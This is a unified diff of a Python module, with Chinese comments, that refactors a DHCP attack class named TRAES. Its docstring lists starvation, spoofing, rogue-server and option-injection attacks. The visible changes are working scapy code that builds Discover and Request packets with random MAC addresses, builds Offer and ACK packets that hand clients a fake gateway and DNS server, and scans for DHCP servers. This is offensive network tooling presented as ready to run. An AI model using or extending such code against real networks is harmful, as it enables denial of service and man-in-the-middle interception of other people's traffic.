@@ -2,63 +2,81 @@
 # -*- coding: utf-8 -*-
 """
 TRAES DHCP攻击模块
-实现DHCP饥饿攻击、DHCP欺骗攻击、DHCP发现扫描、恶意DHCP服务器和DHCP选项注入
+
+实现DHCP攻击功能，包括：
+- DHCP饥饿攻击
+- DHCP欺骗攻击
+- DHCP发现扫描
+- 恶意DHCP服务器
+- DHCP选项注入
+
+作者: Security Researcher
+版本: 1.0.0
 """
 
+import sys
 import time
 import random
 import threading
 import ipaddress
-from typing import List, Dict, Optional, Tuple
-from scapy.all import *
-from scapy.layers.dhcp import DHCP, BOOTP
-from scapy.layers.inet import IP, UDP
-from scapy.layers.l2 import Ether
-from colorama import Fore, Style, init
+from typing import List, Optional, Dict, Any, Tuple
 
-# 初始化colorama
-init(autoreset=True)
-
-# 配置日志
-import logging
-logger = logging.getLogger(__name__)
+try:
+    from scapy.all import (
+        DHCP, BOOTP, Ether, IP, UDP, 
+        srp, send, sendp, sniff, get_if_hwaddr, 
+        conf, RandMAC
+    )
+    from loguru import logger
+    from colorama import Fore, Style
+except ImportError as e:
+    print(f"缺少必要的依赖库: {e}")
+    print("请运行: pip install scapy loguru colorama")
+    sys.exit(1)
 
 class DHCPAttack:
     """
     DHCP攻击类
-    实现多种DHCP攻击方式
+    
+    实现各种DHCP攻击功能，包括DHCP饥饿、欺骗等。
     """
     
-    def __init__(self, config: Dict = None):
+    def __init__(self, config: Dict[str, Any] = None):
         """
         初始化DHCP攻击模块
         
         Args:
-            config (dict): 配置参数
+            config (dict): 配置字典
         """
         self.config = config or {}
+        self.dhcp_config = self.config.get('attack', {}).get('dhcp', {})
+        self.security_config = self.config.get('security', {})
         
         # 攻击参数
-        self.request_rate = self.config.get('request_rate', 10)  # 每秒请求数
-        self.max_requests = self.config.get('max_requests', 1000)  # 最大请求数
-        self.timeout = self.config.get('timeout', 10)  # 超时时间
+        self.request_rate = self.dhcp_config.get('request_rate', 10)
+        self.max_requests = self.dhcp_config.get('max_requests', 1000)
+        self.timeout = self.dhcp_config.get('timeout', 5)
+        self.use_random_mac = self.dhcp_config.get('use_random_mac', True)
         
-        # 恶意DHCP服务器参数
-        self.ip_pool_start = self.config.get('ip_pool_start', '192.168.1.100')
-        self.ip_pool_end = self.config.get('ip_pool_end', '192.168.1.200')
-        self.fake_gateway = self.config.get('fake_gateway', '192.168.1.1')
-        self.fake_dns = self.config.get('fake_dns', ['8.8.8.8', '8.8.4.4'])
+        # 恶意DHCP服务器配置
+        self.malicious_server = self.dhcp_config.get('malicious_server', {})
+        self.fake_gateway = self.malicious_server.get('gateway', '192.168.1.1')
+        self.fake_dns = self.malicious_server.get('dns', ['8.8.8.8', '8.8.4.4'])
+        self.ip_pool_start = self.malicious_server.get('ip_pool_start', '192.168.1.100')
+        self.ip_pool_end = self.malicious_server.get('ip_pool_end', '192.168.1.200')
+        self.lease_time = self.malicious_server.get('lease_time', 3600)
         
-        # 白名单
-        self.whitelist = set(self.config.get('whitelist', []))
+        # 白名单配置
+        self.whitelist_enabled = self.security_config.get('whitelist', {}).get('enabled', True)
+        self.whitelist_macs = set(self.security_config.get('whitelist', {}).get('macs', []))
         
-        # 运行状态
+        # 内部状态
         self.running = False
+        self.allocated_ips = set()
+        self.client_bindings = {}  # MAC -> IP映射
         self.attack_thread = None
         
-        # 客户端绑定记录
-        self.client_bindings = {}
-        self.allocated_ips = set()
+        logger.info("DHCP攻击模块初始化完成")
     
     def generate_random_mac(self) -> str:
         """
@@ -67,11 +85,7 @@ class DHCPAttack:
         Returns:
             str: 随机MAC地址
         """
-        mac = [0x00, 0x16, 0x3e,
-               random.randint(0x00, 0x7f),
-               random.randint(0x00, 0xff),
-               random.randint(0x00, 0xff)]
-        return ':'.join(map(lambda x: "%02x" % x, mac))
+        return str(RandMAC())
     
     def is_whitelisted_mac(self, mac: str) -> bool:
         """
@@ -81,166 +95,179 @@ class DHCPAttack:
             mac (str): MAC地址
             
         Returns:
-            bool: 是否在白名单中
+            bool: 如果在白名单中返回True
         """
-        return mac.lower() in [w.lower() for w in self.whitelist]
+        if not self.whitelist_enabled:
+            return False
+        return mac.lower() in [m.lower() for m in self.whitelist_macs]
     
-    def create_dhcp_discover(self, client_mac: str) -> Ether:
+    def create_dhcp_discover(self, client_mac: str = None, 
+                           client_ip: str = '0.0.0.0',
+                           requested_ip: str = None) -> Ether:
         """
         创建DHCP Discover包
         
         Args:
             client_mac (str): 客户端MAC地址
+            client_ip (str): 客户端IP地址
+            requested_ip (str): 请求的IP地址
             
         Returns:
             Ether: DHCP Discover包
         """
-        # 构造以太网帧
-        ethernet = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
+        if not client_mac:
+            client_mac = self.generate_random_mac() if self.use_random_mac else get_if_hwaddr(conf.iface)
         
-        # 构造IP包
-        ip = IP(src="0.0.0.0", dst="255.255.255.255")
-        
-        # 构造UDP包
-        udp = UDP(sport=68, dport=67)
-        
-        # 构造BOOTP包
-        bootp = BOOTP(
-            op=1,  # 请求
-            htype=1,  # 以太网
-            hlen=6,  # MAC地址长度
-            xid=random.randint(1, 0xFFFFFFFF),  # 事务ID
-            chaddr=[int(x, 16) for x in client_mac.split(':')]  # 客户端MAC
-        )
-        
-        # 构造DHCP选项
+        # 构建DHCP选项
         dhcp_options = [
             ('message-type', 'discover'),
+            ('client_id', client_mac),
+            ('hostname', f'client-{random.randint(1000, 9999)}'),
             ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
             'end'
         ]
         
+        if requested_ip:
+            dhcp_options.insert(-1, ('requested_addr', requested_ip))
+        
+        # 构建数据包
+        ethernet = Ether(src=client_mac, dst='ff:ff:ff:ff:ff:ff')
+        ip = IP(src=client_ip, dst='255.255.255.255')
+        udp = UDP(sport=68, dport=67)
+        bootp = BOOTP(
+            chaddr=[int(x, 16) for x in client_mac.split(':')],
+            xid=random.randint(1, 0xFFFFFFFF)
+        )
         dhcp = DHCP(options=dhcp_options)
         
         return ethernet / ip / udp / bootp / dhcp
     
-    def create_dhcp_request(self, client_mac: str, requested_ip: str, 
-                          server_ip: str) -> Ether:
+    def create_dhcp_request(self, client_mac: str, offered_ip: str, 
+                          server_ip: str, client_ip: str = '0.0.0.0') -> Ether:
         """
         创建DHCP Request包
         
         Args:
             client_mac (str): 客户端MAC地址
-            requested_ip (str): 请求的IP地址
-            server_ip (str): 服务器IP地址
+            offered_ip (str): 服务器提供的IP地址
+            server_ip (str): DHCP服务器IP地址
+            client_ip (str): 客户端IP地址
             
         Returns:
             Ether: DHCP Request包
         """
-        ethernet = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
-        ip = IP(src="0.0.0.0", dst="255.255.255.255")
-        udp = UDP(sport=68, dport=67)
-        bootp = BOOTP(
-            op=1,
-            htype=1,
-            hlen=6,
-            xid=random.randint(1, 0xFFFFFFFF),
-            chaddr=[int(x, 16) for x in client_mac.split(':')]
-        )
-        
         dhcp_options = [
             ('message-type', 'request'),
-            ('requested_addr', requested_ip),
+            ('client_id', client_mac),
+            ('requested_addr', offered_ip),
             ('server_id', server_ip),
+            ('hostname', f'client-{random.randint(1000, 9999)}'),
+            ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
             'end'
         ]
         
+        ethernet = Ether(src=client_mac, dst='ff:ff:ff:ff:ff:ff')
+        ip = IP(src=client_ip, dst='255.255.255.255')
+        udp = UDP(sport=68, dport=67)
+        bootp = BOOTP(
+            chaddr=[int(x, 16) for x in client_mac.split(':')],
+            xid=random.randint(1, 0xFFFFFFFF)
+        )
         dhcp = DHCP(options=dhcp_options)
         
         return ethernet / ip / udp / bootp / dhcp
     
-    def create_dhcp_offer(self, client_mac: str, offered_ip: str, 
-                         server_ip: str, gateway: str, dns_servers: List[str]) -> Ether:
+    def create_dhcp_offer(self, client_mac: str, client_ip: str, 
+                         server_ip: str, gateway: str = None,
+                         dns_servers: List[str] = None) -> Ether:
         """
-        创建DHCP Offer包
+        创建DHCP Offer包（用于恶意DHCP服务器）
         
         Args:
             client_mac (str): 客户端MAC地址
-            offered_ip (str): 提供的IP地址
-            server_ip (str): 服务器IP地址
+            client_ip (str): 分配给客户端的IP地址
+            server_ip (str): DHCP服务器IP地址
             gateway (str): 网关地址
             dns_servers (list): DNS服务器列表
             
         Returns:
             Ether: DHCP Offer包
         """
-        ethernet = Ether(src=get_if_hwaddr(conf.iface), dst=client_mac)
-        ip = IP(src=server_ip, dst=offered_ip)
-        udp = UDP(sport=67, dport=68)
-        bootp = BOOTP(
-            op=2,  # 响应
-            yiaddr=offered_ip,
-            siaddr=server_ip,
-            chaddr=[int(x, 16) for x in client_mac.split(':')],
-            xid=random.randint(1, 0xFFFFFFFF)
-        )
+        if not gateway:
+            gateway = self.fake_gateway
+        if not dns_servers:
+            dns_servers = self.fake_dns
         
         dhcp_options = [
             ('message-type', 'offer'),
             ('server_id', server_ip),
-            ('lease_time', 3600),
+            ('lease_time', self.lease_time),
             ('subnet_mask', '255.255.255.0'),
             ('router', gateway),
-            ('name_server', dns_servers),
+            ('name_server', dns_servers[0] if dns_servers else '8.8.8.8'),
             'end'
         ]
         
+        ethernet = Ether(src=get_if_hwaddr(conf.iface), dst=client_mac)
+        ip = IP(src=server_ip, dst=client_ip)
+        udp = UDP(sport=67, dport=68)
+        bootp = BOOTP(
+            op=2,  # Boot Reply
+            yiaddr=client_ip,
+            siaddr=server_ip,
+            chaddr=[int(x, 16) for x in client_mac.split(':')],
+            xid=random.randint(1, 0xFFFFFFFF)
+        )
         dhcp = DHCP(options=dhcp_options)
         
         return ethernet / ip / udp / bootp / dhcp
     
-    def create_dhcp_ack(self, client_mac: str, client_ip: str, 
-                       server_ip: str, gateway: str, dns_servers: List[str]) -> Ether:
+    def create_dhcp_ack(self, client_mac: str, client_ip: str,
+                       server_ip: str, gateway: str = None,
+                       dns_servers: List[str] = None) -> Ether:
         """
-        创建DHCP ACK包
+        创建DHCP ACK包（用于恶意DHCP服务器）
         
         Args:
             client_mac (str): 客户端MAC地址
-            client_ip (str): 客户端IP地址
-            server_ip (str): 服务器IP地址
+            client_ip (str): 分配给客户端的IP地址
+            server_ip (str): DHCP服务器IP地址
             gateway (str): 网关地址
             dns_servers (list): DNS服务器列表
             
         Returns:
             Ether: DHCP ACK包
         """
+        if not gateway:
+            gateway = self.fake_gateway
+        if not dns_servers:
+            dns_servers = self.fake_dns
+        
+        dhcp_options = [
+            ('message-type', 'ack'),
+            ('server_id', server_ip),
+            ('lease_time', self.lease_time),
+            ('subnet_mask', '255.255.255.0'),
+            ('router', gateway),
+            ('name_server', dns_servers[0] if dns_servers else '8.8.8.8'),
+            'end'
+        ]
+        
         ethernet = Ether(src=get_if_hwaddr(conf.iface), dst=client_mac)
         ip = IP(src=server_ip, dst=client_ip)
         udp = UDP(sport=67, dport=68)
         bootp = BOOTP(
-            op=2,
+            op=2,  # Boot Reply
             yiaddr=client_ip,
             siaddr=server_ip,
             chaddr=[int(x, 16) for x in client_mac.split(':')],
             xid=random.randint(1, 0xFFFFFFFF)
         )
-        
-        dhcp_options = [
-            ('message-type', 'ack'),
-            ('server_id', server_ip),
-            ('lease_time', 3600),
-            ('subnet_mask', '255.255.255.0'),
-            ('router', gateway),
-            ('name_server', dns_servers),
-            'end'
-        ]
-        
         dhcp = DHCP(options=dhcp_options)
         
         return ethernet / ip / udp / bootp / dhcp
     
-    def discover_dhcp_servers(self, interface: str = None, 
-                            timeout: int = 10) -> List[Dict]:
+    def discover_dhcp_servers(self, interface: str = None, timeout: int = 10) -> List[Dict[str, str]]:
         """
         发现网络中的DHCP服务器
         
@@ -256,14 +283,11 @@ class DHCPAttack:
         
         logger.info("开始发现DHCP服务器...")
         
+        # 创建DHCP Discover包
+        discover_packet = self.create_dhcp_discover()
+        
+        # 发送并接收响应
         try:
-            # 生成随机MAC地址
-            client_mac = self.generate_random_mac()
-            
-            # 创建DHCP Discover包
-            discover_packet = self.create_dhcp_discover(client_mac)
-            
-            # 发送包并接收响应
             responses = srp(discover_packet, timeout=timeout, verbose=False)[0]
             
             servers = []
@@ -271,14 +295,7 @@ class DHCPAttack:
                 if received.haslayer(DHCP):
                     dhcp_layer = received[DHCP]
                     
-                    # 检查是否为DHCP Offer
-                    for option in dhcp_layer.options:
-                        if isinstance(option, tuple) and option[0] == 'message-type' and option[1] == 2:
-                            break
-                    else:
-                        continue
-                    
-                    # 提取服务器信息
+                    # 解析DHCP选项
                     server_info = {
                         'server_ip': received[IP].src,
                         'offered_ip': received[BOOTP].yiaddr,
